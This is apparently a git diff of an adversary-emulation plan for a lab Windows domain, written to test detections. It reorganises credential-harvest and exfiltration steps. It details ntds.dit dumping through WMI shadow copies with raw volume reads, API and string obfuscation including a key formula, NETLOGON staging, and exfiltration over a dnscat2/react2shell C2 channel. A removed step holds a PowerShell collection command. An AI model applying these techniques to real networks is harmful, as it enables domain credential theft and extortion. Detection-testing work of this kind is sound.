@@ -8,12 +8,12 @@ After establishing persistent Domain Admin C2 sessions on DC01 and a domain-user
 session on WS01 in Phase 3, the attacker moves into the collection phase in
 preparation for double-extortion. Using the `TESTLAB\Administrator` dnscat2 shell
 on DC01, the attacker harvests credential material from the domain controller and
-produces a single encrypted archive in one tool execution (Step 1). A separate
-collection sweep from the IIS01 SYSTEM dnscat2 shell pulls domain logon scripts
-from DC01's SYSVOL share (Step 2), and a makecab.exe pass archives the staged
-credential files to produce a second, independently scoreable telemetry event
-(Step 3). The archive is then staged into DC01's NETLOGON share and pulled back
-to IIS01 for exfiltration via the react2shell HTTP channel (Step 4).
+produces a single encrypted archive in one tool execution (Step 1). The archive is
+then staged into DC01's NETLOGON share — a local write requiring no outbound
+authentication from the PtH shell — and the IIS01 SYSTEM dnscat2 shell pulls it
+from `\\DC01\NETLOGON\` using machine account Kerberos (Step 2). Step 2 covers
+T1039 (reading the credential archive from the domain network share), T1021.002
+(SMB share access), and T1041 (exfiltration via the react2shell HTTP channel).
 
 Step 1 is the most sensitive step in the phase. `ntds.dit` access through a Volume
 Shadow Copy is the canonical pre-ransomware credential harvest pattern on a Domain
@@ -23,9 +23,9 @@ VSS/NTDS behavior produces a distinct credential-access detection signal indepen
 of the collection signal, and omitting it would make the DC compromise narrative
 incomplete. `check.py` will write the T1003.003 row to `_out_of_scope.csv`.
 
-All four steps run from DC01 and IIS01. No new payloads are required beyond
-`NtdsRawDump.exe`: the makecab.exe step uses a native Windows binary, and the
-exfiltration step reuses the react2shell HTTP channel already open from Phase 2.
+Both steps run from DC01 and IIS01. No new payloads are required beyond
+`NtdsRawDump.exe`: the exfiltration step reuses the react2shell HTTP channel
+already open from Phase 2.
 
 The DC01 PtH shell (Logon Type 3 network token) cannot authenticate outbound to
 IIS01's admin share — NTLM double-hop: the session token carries no credential
@@ -191,18 +191,18 @@ react2shell upload path.
 |  - | - | - | - | - | - | - | - | - | - | -
 | Defense Evasion | T1006 | Direct Volume Access | Windows | `NtdsRawDump.exe` spawned from `RuntimeBroker.exe` ghost (TESTLAB\Administrator, dnscat2 parent); raw device handle opened to `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>` (Sysmon Event 9 RawAccessRead on shadow volume device); no `vssadmin.exe` child process — VSS created and deleted via WMI; Sysmon Event 11: `ntds.tmp`, `system.tmp`, `sam.tmp`, `security.tmp` written to `C:\ProgramData\CertStore\` with no recognizable file magic | Calibrated - Not Benign | `NtdsRawDump.exe` reads NTFS cluster data for `ntds.dit`, `SYSTEM`, `SAM`, and `SECURITY` via raw `ReadFile` on the shadow volume device handle, bypassing WdFilter.sys minifilter callbacks; `FSCTL_GET_RETRIEVAL_POINTERS` called on each shadow file path only to obtain the cluster map — no file data read via the file handle | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
 | Execution | T1047 | Windows Management Instrumentation | Windows | WMI-Activity Event 5857 on DC01: `Win32_ShadowCopy.Create()` and `Win32_ShadowCopy.Delete()` invoked by `NtdsRawDump.exe` (child of `RuntimeBroker.exe` ghost); no `vssadmin.exe` process in the shadow copy creation chain | Calibrated - Not Benign | `NtdsRawDump.exe` creates and deletes the VSS shadow copy via WMI `Win32_ShadowCopy` class methods, suppressing the canonical `vssadmin.exe` process creation signal | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
-| Credential Access | T1003.003 | OS Credential Dumping: NTDS | Windows | `NtdsRawDump.exe` spawned from `RuntimeBroker.exe` ghost; WMI-Activity Event 5857 for `Win32_ShadowCopy.Create()`; Sysmon Event 11: `ntds.tmp` written to `C:\ProgramData\CertStore\` — contains AES-256-CBC-encrypted ntds.dit content; no `vssadmin.exe`, `copy`, or file-path `ReadFile` on ntds.dit in the process tree | Calibrated - Not Benign | `NtdsRawDump.exe` collects the NTDS credential database via raw volume cluster reads from the shadow device; ntds.dit content recovered offline from `ntds.tmp` after AES-256-CBC decryption (pycryptodome) and parsed with `impacket-secretsdump` | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
+| Credential Access | T1003.003 | OS Credential Dumping: NTDS | Windows | `NtdsRawDump.exe` spawned from `RuntimeBroker.exe` ghost; WMI-Activity Event 5857 for `Win32_ShadowCopy.Create()`; Sysmon Event 11: `ntds.tmp` written to `C:\ProgramData\CertStore\` — contains AES-256-CBC-encrypted ntds.dit content; no `vssadmin.exe`, `copy`, or file-path `ReadFile` on ntds.dit in the process tree | Not Calibrated - Not Benign | `NtdsRawDump.exe` collects the NTDS credential database via raw volume cluster reads from the shadow device; ntds.dit content recovered offline from `ntds.tmp` after AES-256-CBC decryption (pycryptodome) and parsed with `impacket-secretsdump` | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
 | Collection | T1005 | Data from Local System | Windows | Sysmon Event 11 on DC01: `ntds.tmp`, `system.tmp`, `sam.tmp`, and `security.tmp` written to `C:\ProgramData\CertStore\` by `NtdsRawDump.exe` descended from `RuntimeBroker.exe` ghost | Calibrated - Not Benign | NTDS credential database and all three registry hives collected from shadow volume raw cluster reads and written as encrypted blobs to the local staging directory | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
 | Collection | T1074.001 | Data Staged: Local Data Staging | Windows | `C:\ProgramData\CertStore\` created on DC01; encrypted credential-material files (`ntds.tmp`, `system.tmp`, `sam.tmp`, `security.tmp`) accumulated before archiving; `certstore.tmp` written to `C:\ProgramData\` as the final staged artifact for exfiltration in Step 4 | Not Calibrated - Not Benign | `C:\ProgramData\CertStore\` is the attacker's local staging directory; individual `.tmp` files and the final `certstore.tmp` archive accumulate here across the tool's execution before exfil | DC01 (10.12.10.10) | TESTLAB\Administrator | - | -
 | Collection | T1119 | Automated Collection | Windows | `NtdsRawDump.exe` completes WMI shadow creation, raw cluster reads for all four credential targets, per-file AES-256-CBC encryption, file writes, shadow deletion, in-memory ZipArchive, and AES-256-CBC archive encryption in a single non-interactive execution without operator intervention between steps | Calibrated - Not Benign | `NtdsRawDump.exe` automates the full DC credential harvest and archive chain — VSS creation via WMI, NTFS cluster map retrieval, raw volume reads, in-memory per-file AES-256-CBC encryption, disk writes, VSS cleanup, in-memory ZipArchive, and AES-256-CBC outer encryption — in one unattended process invocation | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
 | Collection | T1560.002 | Archive Collected Data: Archive via Library | Windows | Sysmon Event 7 on DC01: `System.IO.Compression.dll` loaded into `NtdsRawDump.exe` running under `RuntimeBroker.exe` ghost; no `certstore.zip` Sysmon Event 11 — archive built entirely in-memory via `ZipArchive` over `MemoryStream`, no intermediate file written to disk | Calibrated - Not Benign | `ZipArchive` over `MemoryStream` called in-process within `NtdsRawDump.exe` — no child process spawned, no intermediate zip file on disk; the DLL image load into a non-PowerShell executable is the primary detection signal distinct from T1560.001 | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
 | Collection | T1560.003 | Archive Collected Data: Archive via Custom Method | Windows | Sysmon Event 11 on DC01: `ntds.tmp`, `system.tmp`, `sam.tmp`, `security.tmp` written to `C:\ProgramData\CertStore\` with no NTDS signature or registry hive header — opaque ciphertext with random 16-byte IV prefix; `certstore.tmp` written to `C:\ProgramData\` with no ZIP magic bytes — first 16 bytes are random AES IV, remainder is AES-CBC ciphertext; no `certstore.zip` created at any point | Calibrated - Not Benign | `NtdsRawDump.exe` applies AES-256-CBC (via `AesCryptoServiceProvider`, delegated to Windows CNG) in two passes: per-file before writing each `.tmp` credential blob, and over the in-memory ZIP buffer before writing `certstore.tmp`; random IV prepended per call; no `xor` opcode loop in IL; no recognizable file-format magic on any output file | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
 | Defense Evasion | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | Static analysis of `NtdsRawDump.exe` IAT: only `GetModuleHandleW` and `GetProcAddress` present — `CreateFile`, `DeviceIoControl`, `ReadFile`, `SetFilePointerEx`, `GetFileSizeEx`, and `CloseHandle` absent from import table; Sysmon Event 7: `kernel32.dll` loaded into `NtdsRawDump.exe` with no corresponding DllImport thunks in static disassembly | Calibrated - Not Benign | All operational volume and I/O APIs resolved at runtime: `GetProcAddress` called with position-decoded name strings; `Marshal.GetDelegateForFunctionPointer` used to bind each delegate type — no `[DllImport]` stubs for operational APIs in the compiled PE | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
-| Defense Evasion | T1027 | Obfuscated Files or Information | Windows | Static analysis of `NtdsRawDump.exe` PE: no UTF-16 string literals matching `Win32_ShadowCopy`, NTDS/hive paths, output filenames, or `kernel32.dll` export names; FLOSS / string extraction yields only encoded byte array content — IOC strings absent from binary; no single constant XOR key extractable (position-dependent formula defeats single-byte brute-force) | Calibrated - Not Benign | 30 IOC strings and the AES-256-CBC key stored as position-encoded byte arrays decoded in-memory at runtime; key formula `(BASE=0xA3 + i×STEP=0x5B) & 0xFF` — no constant byte shared across positions; AES key embedded encoded and decoded only at the moment of first use | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
+| Defense Evasion | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | Static analysis of `NtdsRawDump.exe` PE: no UTF-16 string literals matching `Win32_ShadowCopy`, NTDS/hive paths, output filenames, or `kernel32.dll` export names; FLOSS / string extraction yields only encoded byte array content — IOC strings absent from binary; no single constant XOR key extractable (position-dependent formula defeats single-byte brute-force) | Calibrated - Not Benign | 30 IOC strings and the AES-256-CBC key stored as position-encoded byte arrays decoded in-memory at runtime; key formula `(BASE=0xA3 + i×STEP=0x5B) & 0xFF` — no constant byte shared across positions; AES key embedded encoded and decoded only at the moment of first use | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
 
 ---
 
-## [ALT] Step 1B: Alternative Step for Archive Action in Step 1 - Archive via Utility (makecab LOLBin)
+## Step 1B: Alternative Step for Archive Action in Step 1 - Archive via Utility (makecab LOLBin)
 
 ### Voice Track
 
@@ -267,71 +267,7 @@ parent-child relationship unambiguous.
 
 ---
 
-## Step 2 - Network Share Data Collection (DC01 SYSVOL Domain Scripts)
-
-### Voice Track
-
-From the IIS01 SYSTEM dnscat2 shell, the attacker accesses DC01's SYSVOL share
-to collect domain logon scripts. The IIS01 machine account (`IIS01$`) has read
-access to SYSVOL by default — all domain-joined computers do — and authenticates
-via Kerberos using the computer's stored key material. No NT hash, no plaintext
-credential, and no double-hop issue: this is a single-hop SMB connection from IIS01
-to DC01.
-
-The SYSVOL scripts directory (`\\DC01\SYSVOL\testlab.local\scripts\`) is the
-NETLOGON share's physical backing folder. It contains the `update.exe` logon script
-placed in Phase 3 Step 8. The attacker sweeps the directory and copies found scripts
-to a local staging folder on IIS01 — confirming the persistence artifacts already in
-place and harvesting any other domain-wide scripts that may contain credential
-material or configuration data.
-
-The authentication event appears on DC01: `IIS01$` network logon (Logon Type 3)
-from `10.12.10.20`, with Security Event 5145 recording the SYSVOL share access.
-A machine account accessing the SYSVOL scripts directory outside of a user logon
-event is anomalous and detection-relevant.
-
-### Procedures
-
-- ☣️ From the IIS01 SYSTEM dnscat2 shell, create a local collection directory and sweep DC01 SYSVOL scripts
-
-  ```text
-  command (IIS01 SYSTEM) > shell
-
-  C:\Windows\Temp> mkdir C:\Windows\Temp\sysvol_collect
-  C:\Windows\Temp> powershell -NoProfile -Command "Get-ChildItem -Recurse -Path '\\DC01\SYSVOL\testlab.local\scripts' -ErrorAction SilentlyContinue | Copy-Item -Destination 'C:\Windows\Temp\sysvol_collect' -Force -ErrorAction SilentlyContinue"
-  ```
-
-  - ***Expected Output***
-
-    ```text
-    (no output — files copied silently; errors for inaccessible paths suppressed)
-    ```
-
-- ☣️ Verify collected scripts landed locally on IIS01
-
-  ```text
-  C:\Windows\Temp> dir C:\Windows\Temp\sysvol_collect\
-  ```
-
-  - ***Expected Output***
-
-    ```text
-     Directory of C:\Windows\Temp\sysvol_collect
-
-    <date>  <time>      <size> update.exe
-                   1 File(s)    <size> bytes
-    ```
-
-### Reference Tables
-
-| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
-|  - | - | - | - | - | - | - | - | - | - | -
-| Collection | T1039 | Data from Network Shared Drive | Windows | Security Event 4624 on DC01: `IIS01$` network logon (Logon Type 3) from `10.12.10.20`; Security Event 5145 on DC01: `SYSVOL` share accessed, `testlab.local\scripts\` path enumerated by machine account; Sysmon Event 11 on IIS01: domain script files written to `C:\Windows\Temp\sysvol_collect\` by `powershell.exe` under `cmd.exe` (dnscat2 shell parent chain) | Calibrated - Not Benign | `Get-ChildItem -Recurse` from IIS01 SYSTEM dnscat2 shell accesses `\\DC01\SYSVOL\testlab.local\scripts\` using `IIS01$` machine account Kerberos — no plaintext or NT hash required; single-hop SMB; collects domain logon scripts including the `update.exe` persistence artifact placed in Phase 3 Step 8 | IIS01 (10.12.10.20) → DC01 (10.12.10.10) | IIS01$ (SYSTEM) | - | -
-
----
-
-
-## Step 3 - NETLOGON Relay & Exfiltration
+## Step 2 - NETLOGON Relay & Exfiltration
 
 ### Voice Track
 
@@ -488,6 +424,7 @@ decryption pass restores the plaintext `ntds.dit`, `SYSTEM.hiv`, `SAM.hiv`, and
 
 | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
 |  - | - | - | - | - | - | - | - | - | - | -
+| Collection | T1039 | Data from Network Shared Drive | Windows | Security Event 5145 on DC01: `NETLOGON` share accessed by `IIS01$` machine account (Logon Type 3 from `10.12.10.20`); `certstore.tmp` — a non-script binary blob — read from the domain network share outside any user logon event; Sysmon Event 11 on IIS01: `certstore.tmp` written to `C:\inetpub\react.testlab.local\` by `cmd.exe` (dnscat2 shell child) | Calibrated - Not Benign | IIS01 SYSTEM dnscat2 shell reads `certstore.tmp` (AES-256-CBC-encrypted DC credential archive) from `\\DC01\NETLOGON\` using `IIS01$` machine account Kerberos; NETLOGON share used as relay — DC01 PtH Logon Type 3 token carries no outbound credentials for a second hop, so direction is inverted: DC01 writes locally to SYSVOL scripts, IIS01 pulls via single-hop SMB | IIS01 (10.12.10.20) → DC01 (10.12.10.10) | IIS01$ (SYSTEM) | - | -
 | Collection | T1074.001 | Data Staged: Local Data Staging | Windows | Sysmon Event 11 on DC01: `certstore.tmp` written to `C:\Windows\SYSVOL\sysvol\testlab.local\scripts\` by `RuntimeBroker.exe` ghost (TESTLAB\Administrator dnscat2 parent); non-script `.tmp` binary blob in the SYSVOL scripts directory is anomalous — no logon script has this file extension; DFSR change journal records a new file in the replicated SYSVOL folder | Calibrated - Not Benign | `certstore.tmp` (AES-256-CBC-encrypted archive of all DC credential material) copied into the DC01 SYSVOL scripts directory as a staging relay point accessible to domain computers via `\\DC01\NETLOGON\`; avoids outbound SMB from DC01 — local write only | DC01 (10.12.10.10) | TESTLAB\Administrator | - | -
-| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | Security Event 4624 on DC01: `IIS01$` network logon (Logon Type 3) from `10.12.10.20`; Security Event 5145 on DC01: `NETLOGON` share accessed, `certstore.tmp` read by IIS01 machine account; Sysmon Event 11 on IIS01: `certstore.tmp` created in `C:\inetpub\react.testlab.local\` | Calibrated - Not Benign | IIS01 SYSTEM dnscat2 shell copies `\\DC01\NETLOGON\certstore.tmp` to the react.testlab.local web root using `IIS01$` machine account Kerberos over SMB; single-hop from IIS01 to DC01 — same authentication mechanism as Step 2 SYSVOL collection, now used for exfil staging | IIS01 (10.12.10.20) → DC01 (10.12.10.10) | IIS01$ (SYSTEM) | - | -
+| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | Security Event 4624 on DC01: `IIS01$` network logon (Logon Type 3) from `10.12.10.20`; Security Event 5145 on DC01: `NETLOGON` share accessed, `certstore.tmp` read by IIS01 machine account; Sysmon Event 11 on IIS01: `certstore.tmp` created in `C:\inetpub\react.testlab.local\` | Calibrated - Not Benign | IIS01 SYSTEM dnscat2 shell copies `\\DC01\NETLOGON\certstore.tmp` to the react.testlab.local web root using `IIS01$` machine account Kerberos over SMB; single-hop from IIS01 to DC01 — machine account Kerberos avoids the NTLM double-hop constraint of the DC01 PtH Logon Type 3 shell | IIS01 (10.12.10.20) → DC01 (10.12.10.10) | IIS01$ (SYSTEM) | - | -
 | Exfiltration | T1041 | Exfiltration Over C2 Channel | Windows | `node.exe` on IIS01 reads `certstore.tmp` via eval-based `fs.readFileSync` and transmits its content as base64-encoded 8,192-byte chunks in successive HTTP 200 responses to the attacker; same chunked HTTP response stream as Phase 2 `f.elif` download; `certstore.tmp` size distinguishes this transfer from the ~10 s LSASS dump | Calibrated - Not Benign | react2shell `download C:\inetpub\react.testlab.local\certstore.tmp` exfiltrates the AES-256-CBC-encrypted collection archive via the existing react2shell HTTP C2 channel; identical chunked eval-based mechanism to Phase 2 `f.elif` download — new exfil artifact, same C2 channel | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py download()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
